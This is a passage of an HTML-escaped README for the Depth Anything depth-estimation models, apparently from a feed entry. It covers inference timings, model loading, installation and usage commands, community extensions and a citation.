align=&#34;right&#34;&gt;Params&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Inference Time on V100 (ms)&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;A100&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;RTX4090 (&lt;a href=&#34;https://github.com/spacewalk01/depth-anything-tensorrt&#34;&gt;TensorRT&lt;/a&gt;)&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;Depth-Anything-Small&lt;/td&gt; &#xA;   &lt;td align=&#34;right&#34;&gt;24.8M&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;12&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;8&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;3&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;Depth-Anything-Base&lt;/td&gt; &#xA;   &lt;td align=&#34;right&#34;&gt;97.5M&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;13&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;9&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;6&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;left&#34;&gt;Depth-Anything-Large&lt;/td&gt; &#xA;   &lt;td align=&#34;right&#34;&gt;335.3M&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;20&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;13&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;12&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;Note that the V100 and A100 inference time (&lt;em&gt;without TensorRT&lt;/em&gt;) is computed by excluding the pre-processing and post-processing stages, whereas the last column RTX4090 (&lt;em&gt;with TensorRT&lt;/em&gt;) is computed by including these two stages. See &lt;a href=&#34;&#34;&gt;here&lt;/a&gt; for details.&lt;/p&gt; &#xA;&lt;p&gt;You can easily load our pre-trained models by:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from depth_anything.dpt import DepthAnything&#xA;&#xA;encoder = &#39;vits&#39; # can also be &#39;vitb&#39; or &#39;vitl&#39;&#xA;depth_anything = DepthAnything.from_pretrained(&#39;LiheYoung/depth_anything_{:}14&#39;.format(encoder))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;No network connection, cannot load these models?&lt;/h3&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Click here for solutions&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;First, please manually download our models (both config and checkpoints files) from here: &lt;a href=&#34;https://huggingface.co/LiheYoung/depth_anything_vits14&#34;&gt;depth-anything-small&lt;/a&gt;, &lt;a href=&#34;https://huggingface.co/LiheYoung/depth_anything_vitb14&#34;&gt;depth-anything-base&lt;/a&gt;, and &lt;a href=&#34;https://huggingface.co/LiheYoung/depth_anything_vitl14&#34;&gt;depth-anything-large&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;Second, upload the folder which contains config and checkpoint files to your remote server.&lt;/p&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;Lastly, load the model locally by:&lt;/p&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# suppose the config and checkpoint files are stored under the folder checkpoints/depth_anything_vitb14&#xA;depth_anything = DepthAnything.from_pretrained(&#39;checkpoints/depth_anything_vitb14&#39;, local_files_only=True)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Installation&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/LiheYoung/Depth-Anything&#xA;cd Depth-Anything&#xA;pip install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Running&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python run.py --encoder &amp;lt;vits | vitb | vitl&amp;gt; --img-path &amp;lt;img-directory | single-img | txt-file&amp;gt; --outdir &amp;lt;outdir&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For the &lt;code&gt;img-path&lt;/code&gt;, you can either 1) point it to an image directory storing all interested images, 2) point it to a single image, or 3) point it to a text file storing all image paths.&lt;/p&gt; &#xA;&lt;p&gt;For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python run.py --encoder vitl --img-path assets/examples --outdir depth_visualization&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Gradio demo&lt;/h3&gt; &#xA;&lt;p&gt;To use our gradio demo locally:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;python app.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can also try our &lt;a href=&#34;https://huggingface.co/spaces/LiheYoung/Depth-Anything&#34;&gt;online demo&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Import Depth Anything to your project&lt;/h3&gt; &#xA;&lt;p&gt;If you want to use Depth Anything in your own project, you can simply follow &lt;a href=&#34;https://raw.githubusercontent.com/LiheYoung/Depth-Anything/main/run.py&#34;&gt;&lt;code&gt;run.py&lt;/code&gt;&lt;/a&gt; to load our models and define data pre-processing.&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Code snippet (note the difference between our data pre-processing and that of MiDaS)&lt;/summary&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from depth_anything.dpt import DepthAnything&#xA;from depth_anything.util.transform import Resize, NormalizeImage, PrepareForNet&#xA;&#xA;import cv2&#xA;import torch&#xA;&#xA;encoder = &#39;vits&#39; # can also be &#39;vitb&#39; or &#39;vitl&#39;&#xA;depth_anything = DepthAnything.from_pretrained(&#39;LiheYoung/depth_anything_{:}14&#39;.format(encoder))&#xA;&#xA;transform = Compose([&#xA;    Resize(&#xA;        width=518,&#xA;        height=518,&#xA;        resize_target=False,&#xA;        keep_aspect_ratio=True,&#xA;        ensure_multiple_of=14,&#xA;        resize_method=&#39;lower_bound&#39;,&#xA;        image_interpolation_method=cv2.INTER_CUBIC,&#xA;    ),&#xA;    NormalizeImage(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]),&#xA;    PrepareForNet(),&#xA;])&#xA;&#xA;image = cv2.cvtColor(cv2.imread(&#39;your image path&#39;), cv2.COLOR_BGR2RGB) / 255.0&#xA;image = transform({&#39;image&#39;: image})[&#39;image&#39;]&#xA;image = torch.from_numpy(image).unsqueeze(0)&#xA;&#xA;# depth shape: 1xHxW&#xA;depth = depth_anything(image)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;h2&gt;Community Support&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;We sincerely appreciate all the extentions built on our Depth Anything from the community. Thank you a lot!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Here we list the extensions we have found:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Depth Anything ONNX: &lt;a href=&#34;https://github.com/fabio-sim/Depth-Anything-ONNX&#34;&gt;https://github.com/fabio-sim/Depth-Anything-ONNX&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Depth Anything TensorRT: &lt;a href=&#34;https://github.com/spacewalk01/depth-anything-tensorrt&#34;&gt;https://github.com/spacewalk01/depth-anything-tensorrt&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Depth Anything in ControlNet WebUI: &lt;a href=&#34;https://github.com/Mikubill/sd-webui-controlnet&#34;&gt;https://github.com/Mikubill/sd-webui-controlnet&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Depth Anything in X-AnyLabeling: &lt;a href=&#34;https://github.com/CVHub520/X-AnyLabeling&#34;&gt;https://github.com/CVHub520/X-AnyLabeling&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you have your amazing projects supporting or improving (&lt;em&gt;e.g.&lt;/em&gt;, speed) Depth Anything, please feel free to drop an issue. We will add them here.&lt;/p&gt; &#xA;&lt;h2&gt;Citation&lt;/h2&gt; &#xA;&lt;p&gt;If you find this project useful, please consider citing:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bibtex&#34;&gt;@article{depthanything,&#xA;      title={Depth Anything: Unleashing the Power of Large-Scale Unlabeled Data}, &#xA;      author={Yang, Lihe and Kang, Bingyi and Huang, Zilong and Xu, Xiaogang and Feng, Jiashi and Zhao, Hengshuang},&#xA;      journal={arXiv:2401.10891},&#xA;      year={2024}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
</feed>